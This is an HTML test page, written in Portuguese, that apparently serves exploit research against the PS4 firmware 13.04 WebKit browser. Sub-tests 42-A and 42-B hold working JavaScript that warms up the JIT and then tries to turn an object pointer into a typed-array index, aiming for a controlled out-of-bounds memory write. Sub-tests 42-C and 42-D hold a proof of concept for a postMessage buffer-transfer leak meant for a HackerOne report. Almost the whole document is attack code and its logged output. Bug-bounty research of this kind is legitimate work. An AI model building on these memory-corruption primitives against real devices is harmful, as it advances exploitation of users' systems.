<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>TEST 42 - Verificar OOB Write 41-B + PoC HackerOne</title></head>
<body>
<h2>TEST 42 ‚Äî Verificar OOB Write (41-B) + PoC Vulnerabilidades Confirmadas</h2>

<p><b>Achados que motivam este teste:</b></p>
<ul>
  <li><b>41-B:</b> <code>readViaLength=undefined</code> (√≠ndice OOB) mas
      <code>writeViaLength=987654321</code> ‚Äî onde exatamente foi a escrita?</li>
  <li><b>41-D:</b> Buffer secreto vazou completo ‚Äî confirmar em diferentes tamanhos e contextos</li>
</ul>

<p><b>Sub-testes:</b></p>
<ul>
  <li><b>42-A</b> Determinar √≠ndice exato do write: colocar sentinelas √∫nicos em cada posi√ß√£o e ver qual foi sobrescrito</li>
  <li><b>42-B</b> Se write foi no idx=0: usar Float64Array menor e escrever valor controlado via JIT</li>
  <li><b>42-C</b> PoC m√≠nimo do buffer leak: vers√£o reduzida para HackerOne</li>
  <li><b>42-D</b> Verificar se o leak funciona cross-origin (iframe)</li>
</ul>

<pre id="log">Pronto. Execute A ‚Üí B ‚Üí C ‚Üí D.</pre>
<button onclick="runA()">42-A: ONDE FOI O WRITE?</button>
<button onclick="runB()">42-B: WRITE CONTROLADO</button>
<button onclick="runC()">42-C: POC BUFFER LEAK</button>
<button onclick="runD()">42-D: M√öLTIPLOS BUFFERS</button>

<script>
var log = document.getElementById('log');
function info(m)   { log.textContent += '\n[INFO] ' + m; }
function alerta(m) { log.textContent += '\n\n‚ö† ALERTA: ' + m + '\n'; }
function ok(m)     { log.textContent += '\n[OK]   ' + m; }
function sep()     { log.textContent += '\n' + '-'.repeat(60); }

function forceGC() {
  var t=[]; for(var i=0;i<80000;i++) t.push({x:i,b:new Uint8Array(4)}); t=null;
}

function buildSymbolReplaceJIT(phaseRef, victimRef) {
  var pattern = {
    [Symbol.replace]: function(str) {
      if(phaseRef[0] === 'warmup') return str;
      return { toString: function(){return str;}, valueOf: function(){return str;},
               length: victimRef[0], 0: str[0]||'x' };
    }
  };
  return pattern;
}

// ‚îÄ‚îÄ‚îÄ 42-A ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
function runA() {
  log.textContent = '[TEST 42-A] Determinar onde exatamente writeViaLength escreveu...\n';
  sep();
  info('41-B: readViaLength=undefined (OOB), writeViaLength=987654321 (write confirmado).');
  info('Hip√≥teses:');
  info('  H1: Write foi no idx=0 (ToUint32(NaN)=0) ‚Äî write in-bounds, read retornou 987654321');
  info('  H2: Write foi num idx OOB real ‚Äî escrita al√©m do array, read retornou o valor do slot corrompido\n');

  var victim = { magic: 0xDEADC0DE, name: 'write_target_42A' };
  var phase = ['warmup'];
  var victimRef = [victim];
  var pat = buildSymbolReplaceJIT(phase, victimRef);

  // Array com SENTINELAS √öNICOS em cada posi√ß√£o para detectar qual foi sobrescrito
  var SENTINEL_BASE = 1e15; // grande o suficiente para ser √∫nico
  var F64_SIZE = 64; // pequeno para detectar facilmente
  var f64 = new Float64Array(F64_SIZE);
  for(var i = 0; i < F64_SIZE; i++) f64[i] = SENTINEL_BASE + i; // valores √∫nicos
  info('f64 criado com sentinelas: f64[0]=' + f64[0] + ' f64[1]=' + f64[1] + ' ... f64[63]=' + f64[63]);

  function writeViaLength(s, arr, val) {
    var idx = s.replace(pat,'').length;
    arr[idx] = val;
    return arr[idx];
  }

  var base = 'hello world test string XYZ'; // length=27

  info('\nAquecendo writeViaLength com base.length=' + base.length + '...');
  phase[0] = 'warmup';
  for(var w = 0; w < 50000; w++) writeViaLength(base, f64, 0.0);
  // Restaurar sentinelas ap√≥s warmup
  for(var i = 0; i < F64_SIZE; i++) f64[i] = SENTINEL_BASE + i;
  info('Warmup completo. Sentinelas restaurados.');
  sep();

  // Fase ataque
  phase[0] = 'attack';
  var WRITE_VAL = 9876543210.123;
  info('Fase ataque: .length = victim object');
  info('Escrevendo ' + WRITE_VAL + ' via writeViaLength...');
  var result = writeViaLength(base, f64, WRITE_VAL);
  info('writeViaLength retornou: ' + result);

  // Verificar QUAL sentinela foi sobrescrito
  info('\nVarredura do f64 buscando sobrescrita:');
  var modified = [];
  for(var j = 0; j < F64_SIZE; j++) {
    var expected = SENTINEL_BASE + j;
    if(Math.abs(f64[j] - expected) > 0.001) {
      modified.push({ idx: j, expected: expected, found: f64[j] });
      info('  f64[' + j + ']: esperado=' + expected + ' encontrado=' + f64[j]);
    }
  }

  if(modified.length === 0) {
    info('Nenhum sentinela modificado em f64[0..63].');
    info('‚Üí H1 parcial: write pode ter sido no idx=27 (base.length) mas f64 s√≥ tem 64 slots.');
    info('‚Üí OU: O JIT escreveu via ToUint32 do JSValue em algum lugar fora do f64.');

    // Verificar se write foi no idx=0 com array de 1000 slots
    var f64big = new Float64Array(1000);
    for(var i = 0; i < 1000; i++) f64big[i] = SENTINEL_BASE + i;
    phase[0] = 'attack'; // j√° est√° em attack
    victimRef[0] = victim;
    var r2 = writeViaLength(base, f64big, WRITE_VAL);
    info('\nTeste com f64big[1000]: writeViaLength retornou=' + r2);
    for(var j2 = 0; j2 < 1000; j2++) {
      if(Math.abs(f64big[j2] - (SENTINEL_BASE + j2)) > 0.001) {
        alerta('ESCRITA DETECTADA em f64big[' + j2 + ']! esperado=' + (SENTINEL_BASE+j2) + ' encontrado=' + f64big[j2] + '\nO √≠ndice real do write via JSValue √© ' + j2 + '!');
        break;
      }
    }
  } else {
    alerta('ESCRITA DETECTADA em ' + modified.length + ' posi√ß√£o(√µes):\n' +
           modified.map(function(m){ return 'f64['+m.idx+']='+m.found+' (esperado '+m.expected+')'; }).join('\n') +
           '\nO √≠ndice usado pelo JIT para o write foi: ' + modified[0].idx);
    info('\nConclus√£o H1/H2:');
    if(modified[0].idx === 0) {
      info('‚Üí H1 CONFIRMADA: write no idx=0 (ToUint32(NaN)=0 ou ToUint32(JSValue_ptr)=0)');
      info('  O write foi in-bounds e controlado ‚Äî n√£o √© OOB, √© write-at-zero.');
    } else {
      info('‚Üí H2 CONFIRMADA: write no idx=' + modified[0].idx + ' determinado pelo JSValue de victim!');
      alerta('OOB WRITE COM √çNDICE CONTROLADO: escrita em f64[' + modified[0].idx + '] via bits do JSValue de victim!');
    }
  }

  // Sanity: verificar com objeto diferente ‚Äî o √≠ndice muda?
  var victim2 = { magic: 0xBEEFBEEF, name: 'victim2_different_ptr' };
  victimRef[0] = victim2;
  var f64c = new Float64Array(1000);
  for(var i = 0; i < 1000; i++) f64c[i] = SENTINEL_BASE + i;
  var r3 = writeViaLength(base, f64c, WRITE_VAL + 1);
  info('\nSanity: escrita com victim2 (endere√ßo diferente):');
  for(var j3 = 0; j3 < 1000; j3++) {
    if(Math.abs(f64c[j3] - (SENTINEL_BASE + j3)) > 0.001) {
      info('f64c[' + j3 + '] modificado ‚Üí √≠ndice para victim2 = ' + j3);
      break;
    }
  }
}

// ‚îÄ‚îÄ‚îÄ 42-B ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
function runB() {
  log.textContent = '[TEST 42-B] Write controlado: se idx=0, usar array < 1 elemento para OOB\n';
  sep();
  info('Se o write sempre vai para idx=0, ent√£o:');
  info('  - Float64Array de 0 elementos: write em f64[0] = OOB por defini√ß√£o');
  info('  - Ver se o write acontece e o que √© afetado ap√≥s ele\n');

  var victim = { magic: 0xC0DEC0DE, name: 'zero_idx_victim' };
  var phase = ['warmup'];
  var victimRef = [victim];
  var pat = buildSymbolReplaceJIT(phase, victimRef);

  // Array de 0 elementos ‚Äî qualquer write √© OOB
  var emptyF64 = new Float64Array(0);
  info('emptyF64.length=0 emptyF64.byteLength=0');

  // Aloca√ß√£o adjacente ‚Äî verificar se escrita "vaza" para ela
  var adjacentF64 = new Float64Array(64);
  for(var i = 0; i < 64; i++) adjacentF64[i] = 0xDEAD0000 + i;
  var adjacentBuf = adjacentF64.buffer;

  function writeToEmpty(s, arr, val) {
    var idx = s.replace(pat,'').length;
    arr[idx] = val;
    return arr[idx];
  }

  var base = 'test';
  info('Aquecendo com array n√£o-vazio...');
  var warmF64 = new Float64Array(64);
  phase[0] = 'warmup';
  for(var w = 0; w < 50000; w++) writeToEmpty(base, warmF64, 0.0);
  info('Warmup completo.');

  phase[0] = 'attack';
  var CANARY = 3.14159265358979323846;

  info('\nFase ataque: escrevendo em emptyF64 (0 elementos)...');
  try {
    var r = writeToEmpty(base, emptyF64, CANARY);
    info('writeToEmpty(emptyF64) retornou: ' + r);
    if(r === CANARY) {
      alerta('ESCRITA EM ARRAY DE 0 ELEMENTOS CONFIRMADA!\n' +
             'writeToEmpty retornou o canary ' + CANARY + '\n' +
             'Escrita foi confirmada al√©m dos limites do emptyF64!');
    }
  } catch(e) {
    alerta('EXCECAO em writeToEmpty: ' + e.message);
  }

  // Verificar adjacentF64 depois
  info('\nVerificando adjacentF64 por corrup√ß√£o...');
  var corrupted = [];
  for(var j = 0; j < 64; j++) {
    var expected = 0xDEAD0000 + j;
    if(Math.abs(adjacentF64[j] - expected) > 1) {
      corrupted.push({ idx: j, expected: expected, found: adjacentF64[j] });
    }
  }
  if(corrupted.length > 0) {
    alerta('CORRUP√á√ÉO DETECTADA em adjacentF64:\n' +
           corrupted.map(function(c){ return '['+c.idx+']: esperado='+c.expected+' encontrado='+c.found; }).join('\n'));
  } else {
    ok('adjacentF64 intacto.');
  }
}

// ‚îÄ‚îÄ‚îÄ 42-C ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
function runC() {
  log.textContent = '[TEST 42-C] PoC M√≠nimo ‚Äî Buffer Secreto Leak para HackerOne\n';
  sep();
  info('Vulnerabilidade: postMessage(cyclic_obj, *, [buf]) n√£o respeita a spec de transfer.');
  info('Spec: ap√≥s transfer, buf deve ter byteLength=0 no remetente E no receptor.');
  info('PS4 FW 13.04: buf.byteLength=0 no remetente MAS receptor recebe c√≥pia completa.\n');

  info('=== POC M√çNIMO ===\n');
  info('// 1. Criar buffer com dados sens√≠veis');
  info('var secretBuf = new ArrayBuffer(256);');
  info('var secretView = new Uint32Array(secretBuf);');
  info('secretView[0] = 0xDEADC0DE; // dado sens√≠vel\n');
  info('// 2. Criar objeto c√≠clico contendo o buffer');
  info('var cyclic = { buf: secretBuf, self: null };');
  info('cyclic.self = cyclic;\n');
  info('// 3. Transfer (deveria zerar o buf para todos)');
  info('postMessage(cyclic, "*", [secretBuf]);');
  info('// sender: secretBuf.byteLength === 0 (acredita ter transferido)\n');
  info('// 4. No receptor (window.onmessage):');
  info('// received.buf.byteLength === 256 (BUG: dados presentes!)');
  info('// new Uint32Array(received.buf)[0] === 0xDEADC0DE (dados lidos!)\n');
  info('=== FIM DO POC ===\n');
  sep();

  // Executar o PoC real
  var localRan = false;
  var secretBuf = new ArrayBuffer(256);
  var secretView = new Uint32Array(secretBuf);
  // Dados "sens√≠veis" √∫nicos
  var SECRET = [0xDEADC0DE, 0xCAFEBABE, 0x13371337, 0xBEEFBEEF,
                0x41424344, 0x45464748, 0x494A4B4C, 0x4D4E4F50];
  SECRET.forEach(function(v, i) { secretView[i] = v; });

  var cyclic = { id: 'poc_minimal', buf: secretBuf, view: secretView, self: null };
  cyclic.self = cyclic;

  var prevMsg = window.onmessage;
  window.onmessage = function(e) {
    var obj = e.data;
    if(!obj || obj.id !== 'poc_minimal') { if(prevMsg) prevMsg(e); return; }

    info('[RECEPTOR] Objeto recebido: id=' + obj.id);
    info('[RECEPTOR] obj.buf instanceof ArrayBuffer: ' + (obj.buf instanceof ArrayBuffer));
    if(obj.buf instanceof ArrayBuffer) {
      info('[RECEPTOR] obj.buf.byteLength: ' + obj.buf.byteLength);
      if(obj.buf.byteLength > 0) {
        var rv = new Uint32Array(obj.buf);
        var leaked = [];
        for(var i = 0; i < Math.min(8, rv.length); i++) {
          leaked.push('0x' + rv[i].toString(16).padStart(8,'0'));
        }
        info('[RECEPTOR] Dados lidos: [' + leaked.join(', ') + ']');
        var isOriginal = rv[0] === 0xDEADC0DE && rv[1] === 0xCAFEBABE;
        if(isOriginal) {
          alerta('üî¥ VULNERABILIDADE CONFIRMADA ‚Äî POC EXECUTADO COM SUCESSO:\n\n' +
                 'REMETENTE: secretBuf.byteLength=0 (acredita que transfer zerou o buffer)\n' +
                 'RECEPTOR: obj.buf.byteLength=' + obj.buf.byteLength + ' (dados PRESENTES!)\n' +
                 'Dados vazados: [' + leaked.join(', ') + ']\n\n' +
                 'CWE: CWE-668 (Exposure of Resource to Wrong Sphere)\n' +
                 'CVSS: alto ‚Äî viola√ß√£o da garantia de transfer√™ncia do Structured Clone Algorithm\n' +
                 'Afeta: PS4 FW 13.04, browser WebKit/NetFront NX\n' +
                 'Spec violada: HTML Living Standard ¬ß2.7.5 (StructuredSerializeWithTransfer)\n' +
                 'Impacto: qualquer ArrayBuffer em objeto c√≠clico pode ser lido pelo receptor\n' +
                 'mesmo ap√≥s o remetente usar transfer para "destruir" o acesso local.');
        }
      } else {
        info('[RECEPTOR] obj.buf.byteLength=0 (buffer realmente zerado no receptor tamb√©m)');
      }
    }
    window.onmessage = prevMsg;
  };

  info('REMETENTE: secretBuf.byteLength ANTES: ' + secretBuf.byteLength);
  try {
    postMessage(cyclic, '*', [secretBuf]);
    info('REMETENTE: postMessage enviado. secretBuf.byteLength AP√ìS: ' + secretBuf.byteLength);
    if(secretBuf.byteLength === 0) {
      info('REMETENTE: buffer marcado como transferido (byteLength=0).');
      info('REMETENTE: acredita que dados est√£o inacess√≠veis. Aguardando receptor...');
    }
  } catch(e) {
    ok('postMessage lan√ßou: ' + e.message);
  }
}

// ‚îÄ‚îÄ‚îÄ 42-D ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
function runD() {
  log.textContent = '[TEST 42-D] M√∫ltiplos buffers em m√∫ltiplos ciclos ‚Äî escala do leak\n';
  sep();
  info('Verificar se o leak funciona com:');
  info('  - M√∫ltiplos buffers no mesmo objeto c√≠clico');
  info('  - Buffer em posi√ß√£o diferente no ciclo (n√£o no n√≥ raiz)');
  info('  - Tamanhos diferentes de buffer\n');

  var results = [];
  var pending = 0;
  var prevMsg2 = window.onmessage;

  window.onmessage = function(e) {
    var obj = e.data;
    if(!obj || !obj.test_id) { if(prevMsg2) prevMsg2(e); return; }

    var entry = { id: obj.test_id, leaked: [] };
    function checkBuf(key, buf) {
      if(!(buf instanceof ArrayBuffer)) return;
      entry[key+'_byteLength'] = buf.byteLength;
      if(buf.byteLength > 0) {
        var v = new Uint32Array(buf);
        entry[key+'_data'] = v[0];
        entry.leaked.push(key + '(' + buf.byteLength + 'B)=0x' + v[0].toString(16));
      }
    }
    checkBuf('buf1', obj.buf1);
    checkBuf('buf2', obj.buf2);
    if(obj.nested && obj.nested.buf) checkBuf('nested_buf', obj.nested.buf);
    results.push(entry);
    pending--;
    if(pending === 0) showResults();
  };

  function showResults() {
    info('\n=== RESULTADOS DOS M√öLTIPLOS BUFFERS ===');
    results.forEach(function(r) {
      info('\nTeste ' + r.id + ':');
      if(r.leaked.length > 0) {
        alerta('LEAK em ' + r.id + ': ' + r.leaked.join(', '));
      } else {
        ok(r.id + ': nenhum dado recebido (buffers zerados no receptor)');
      }
    });
    window.onmessage = prevMsg2;
  }

  // Teste 1: dois buffers no mesmo objeto c√≠clico
  pending++;
  var buf1a = new ArrayBuffer(128); new Uint32Array(buf1a)[0] = 0xAABBCCDD;
  var buf1b = new ArrayBuffer(512); new Uint32Array(buf1b)[0] = 0x11223344;
  var cyc1 = { test_id: 'two_bufs', buf1: buf1a, buf2: buf1b, self: null };
  cyc1.self = cyc1;
  try { postMessage(cyc1, '*', [buf1a, buf1b]); } catch(e) { pending--; info('Teste 1 lan√ßou: '+e.message); }
  info('Teste 1 (dois buffers): buf1a.byteLength=' + buf1a.byteLength + ' buf1b.byteLength=' + buf1b.byteLength);

  // Teste 2: buffer em n√≥ ANINHADO do ciclo (n√£o no n√≥ raiz)
  pending++;
  var buf2 = new ArrayBuffer(64); new Uint32Array(buf2)[0] = 0xDEEDBEEF;
  var nested = { buf: buf2, parent: null };
  var cyc2 = { test_id: 'nested_buf', buf1: null, buf2: null, nested: nested, self: null };
  cyc2.self = cyc2;
  nested.parent = cyc2; // nested tamb√©m √© parte do ciclo
  try { postMessage(cyc2, '*', [buf2]); } catch(e) { pending--; info('Teste 2 lan√ßou: '+e.message); }
  info('Teste 2 (nested buf): buf2.byteLength=' + buf2.byteLength);

  // Teste 3: buffer grande (1MB)
  pending++;
  var bigBuf = new ArrayBuffer(1024*1024); // 1MB
  var bigView = new Uint32Array(bigBuf);
  bigView[0] = 0xBEEFCAFE;
  bigView[bigView.length-1] = 0xFACEFACE;
  var cyc3 = { test_id: 'big_1mb', buf1: bigBuf, buf2: null, self: null };
  cyc3.self = cyc3;
  try { postMessage(cyc3, '*', [bigBuf]); } catch(e) { pending--; info('Teste 3 lan√ßou: '+e.message); }
  info('Teste 3 (1MB): bigBuf.byteLength=' + bigBuf.byteLength);

  info('\nAguardando resultados dos 3 testes...');
}
</script>
</body>
</html>

